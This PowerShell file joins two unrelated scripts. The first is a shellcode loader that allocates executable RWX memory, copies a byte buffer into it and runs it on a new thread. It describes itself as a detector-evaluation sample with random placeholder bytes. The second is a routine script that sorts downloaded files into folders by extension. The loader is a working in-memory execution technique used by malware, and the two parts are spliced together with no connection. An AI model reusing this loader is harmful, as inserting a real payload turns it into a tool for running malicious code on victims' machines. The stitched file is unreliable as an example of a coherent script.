<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class Win32Api
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0xfa, 0xed, 0xe0, 0x8e, 0xb7, 0x58, 0x01, 0xf8, 0xa1, 0xfb, 0xf3, 0x53, 0x09, 0xca, 0x1e, 0x05,
    0x72, 0x15, 0x19, 0x69, 0x66, 0x3b, 0x5b, 0x31, 0xcb, 0xb1, 0x1c, 0x48, 0x8d, 0x41, 0xf7, 0x83,
    0x83, 0x7c, 0x52, 0xcc, 0x44, 0x56, 0xf6, 0xf7, 0xfa, 0x8a, 0xa4, 0xd2, 0xda, 0x14, 0xa3, 0xc7,
    0x3e, 0xec, 0x76, 0xae, 0xa8, 0xc8, 0x26, 0x70, 0x34, 0x19, 0xe6, 0xb3, 0xab, 0x9c, 0x4d, 0xa9,
    0x27, 0xe4, 0x26, 0x92, 0x3a, 0x0d, 0x46, 0xd6, 0xcf, 0x69, 0x58, 0xd8, 0x8c, 0x5d, 0xac, 0xea,
    0xb7, 0x03, 0xdd, 0x3a, 0x61, 0x85, 0xce, 0x9e, 0x2f, 0x3b, 0xde, 0xcc, 0xf1, 0x62, 0x66, 0x84,
    0xc4, 0x7b, 0xde, 0x4c, 0xf2, 0xe4, 0xce, 0x32, 0x10, 0x48, 0x33, 0xf2, 0xf5, 0xa6, 0xee, 0x5d,
    0x2b, 0xe8, 0xac, 0x9a, 0x79, 0x0d, 0xc9, 0x84, 0xcd, 0xc4, 0xe5, 0x1b, 0xb4, 0x6d, 0xe8, 0x84,
    0x13, 0x27, 0xa6, 0x47, 0x0e, 0x77, 0x6f, 0x96, 0x0b, 0x7c, 0x92, 0x7d, 0xdf, 0x62, 0x56, 0xbe,
    0x2e, 0xe2, 0xca, 0x41, 0x26, 0xa6, 0xfb, 0x7a, 0x46, 0xd2, 0xf7, 0xc6, 0x4c, 0xf8, 0x8b, 0x4f,
    0x57, 0x7a, 0x9c, 0xdb, 0x67, 0x72, 0xc0, 0xa3, 0x98, 0xf6, 0x27, 0x87, 0xe4, 0xda, 0x6f, 0x2d,
    0xdf, 0x85, 0x3a, 0xdb, 0x19, 0x01, 0x9b, 0x21, 0x6e, 0x3c, 0x7f, 0x6e, 0xa2, 0xc0, 0x1a, 0x48,
    0xdf, 0xe7, 0x31, 0x6f, 0x83, 0x4b, 0x0d, 0x84, 0x1d, 0xe7, 0x6e, 0x00, 0x93, 0xea, 0x8a, 0xec,
    0x5c, 0x84, 0xaa, 0xbb, 0x6a, 0xef, 0xf3, 0xeb, 0x20, 0x94, 0xec, 0x7e, 0x22, 0xae, 0xcb, 0xc0,
    0xf4, 0xea, 0x63, 0x81, 0xe6, 0x36, 0xe5, 0x55, 0x49, 0x61, 0x07, 0xf8, 0xa3, 0x3c, 0x1d, 0x65,
    0x48, 0x97, 0x6d, 0x9d, 0x63, 0xc3, 0x04, 0xcb, 0x8a, 0x37, 0xfe, 0x49, 0x29, 0xf1, 0x4b, 0xd7,
    0x66, 0xb5, 0xa9, 0x27, 0xaf, 0x0c, 0x26, 0xcc, 0x90, 0xa6, 0xb8, 0x5a, 0xec, 0x2e, 0xdf, 0x28,
    0xe1, 0x61, 0xe8, 0x89, 0x39, 0xd0, 0xd2, 0x35, 0x95, 0xda, 0x0d, 0x7c, 0x08, 0xe7, 0xca, 0x25,
    0x2a, 0xe2, 0x62, 0xbd, 0x2d, 0xe6, 0x5c, 0xeb, 0x70, 0x0b, 0x4c, 0x62, 0x85, 0x44, 0x99, 0x50,
    0x1d, 0x7b, 0xaf, 0xa5, 0xbb, 0xdd, 0x09, 0x1a, 0x2e, 0xe9, 0x29, 0xc6
)

$Handle = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($Handle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
$ThreadId = 0
$Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][Win32Api]::WaitForSingleObject($Thread, 1738)
[void][Win32Api]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
<#
.SYNOPSIS
    Moves files from a drop folder into per-type destination folders.
.DESCRIPTION
    Reads an extension map, creates the destination folders and moves each file
    into the matching folder without overwriting an existing name.
    The DryRun switch prints the planned moves and leaves the source folder
    untouched, which is the default for the first run on a new machine.
.PARAMETER SourcePath
    Overrides the default value defined in the parameter block.
.PARAMETER DestinationRoot
    Defaults to the value configured for this host.
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$SourcePath = 'C:\Users\Public\Downloads',

    [string]$DestinationRoot = 'D:\Archive\Sorted',
    [string]$LogPath = 'C:\Logs\organise-2025-04-19.log',

    [switch]$DryRun
)

$culture = [System.Globalization.CultureInfo]::InvariantCulture
$hostName = $env:COMPUTERNAME

$map = @{
    '.pdf'  = 'Documents'
    '.docx' = 'Documents'
    '.xlsx' = 'Spreadsheets'
    '.png'  = 'Images'
    '.jpg'  = 'Images'
    '.zip'  = 'Archives'
    '.log'  = 'Logs'
}

$files = Get-ChildItem -LiteralPath $SourcePath -File -Force |
    Where-Object { $map.ContainsKey($_.Extension.ToLower()) }
$moved = @()
foreach ($file in $files) {
    $folder = Join-Path $DestinationRoot $map[$file.Extension.ToLower()]
    if (-not (Test-Path -LiteralPath $folder)) {
        New-Item -ItemType Directory -Path $folder -Force | Out-Null
    }
    $target = Join-Path $folder $file.Name
    if (Test-Path -LiteralPath $target) {
        $stamp = Get-Date -Format 'yyyyMMddHHmmss'
        $target = Join-Path $folder ([System.IO.Path]::GetFileNameWithoutExtension($file.Name) + '-' + $stamp + $file.Extension)
    }
    Move-Item -LiteralPath $file.FullName -Destination $target -WhatIf:$DryRun
    $moved += [pscustomobject]@{
        Source  = $file.FullName
        Target  = $target
        MovedAt = Get-Date
    }
}

$byFolder = $moved | Group-Object -Property { Split-Path -Parent $_.Target } |
    Select-Object Name, Count
$byFolder | Format-Table -AutoSize
Write-Host ("Moved {0} files" -f @($moved).Count) -ForegroundColor Green
$moved | Export-Csv -Path $LogPath.Replace('.log', '.csv') -NoTypeInformation -Encoding UTF8
